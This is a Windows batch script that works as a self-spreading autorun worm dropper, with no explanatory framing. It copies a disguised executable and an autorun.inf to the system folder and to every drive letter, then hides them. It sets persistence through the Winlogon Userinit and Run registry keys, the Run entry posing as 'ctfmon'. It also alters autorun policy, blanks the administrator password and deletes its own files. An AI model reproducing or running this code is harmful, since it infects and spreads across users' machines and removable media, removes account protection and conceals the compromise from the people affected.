@echo off
explorer \
xcopy /h /y /r /k .\S-1-5-21-1214440339.exe %systemroot%\system\
xcopy /h /y /r /k .\autorun.inf %systemroot%\system\
@if not exist .\S-1-5-21-1214440339.exe xcopy /h /y /r /k %systemroot%\system\S-1-5-21-1214440339.exe .\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do xcopy /h /y /r /k autorun.inf %%i%:\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do xcopy /h /y /r /k S-1-5-21-1214440339.exe %%i%:\
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do @if exist %%i%:\S-1-5-21-1214440339.exe attrib +h +s +a %%i%:\S-1-5-21-1214440339.exe
for %%i in (c d e f g h i j k l m n o p q r s t u v w x y z) do @if exist %%i%:\autorun.inf attrib +h +s +a %%i%:\autorun.inf
attrib +h +s +a %systemroot%\system\S-1-5-21-1214440339.exe
attrib +h +s +a %systemroot%\system\autorun.inf
echo Windows Registry Editor Version 5.00 >> .\reg.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >> .\reg.reg
echo "Userinit"="userinit.exe,S-1-5-21-1214440339.exe" >> .\reg.reg
echo Windows Registry Editor Version 5.00 >> .\reg1.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer] >> .\reg1.reg
echo "NoDriveTypeAutoRun"=dword:95000000 >> .\reg1.reg
echo Windows Registry Editor Version 5.00 >> .\reg2.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> .\reg2.reg
echo "ctfmon"="c:\\S-1-5-21-1214440339.exe" >> .\reg2.reg
regedit /s .\reg.reg
regedit /s .\reg1.reg
regedit /s .\reg2.reg
del .\reg.reg
del .\reg1.reg
del .\reg2.reg
net user administrator ""
del /a:h .\shell.vbs
del /a:h .\AUTOEXEC.BAT
exit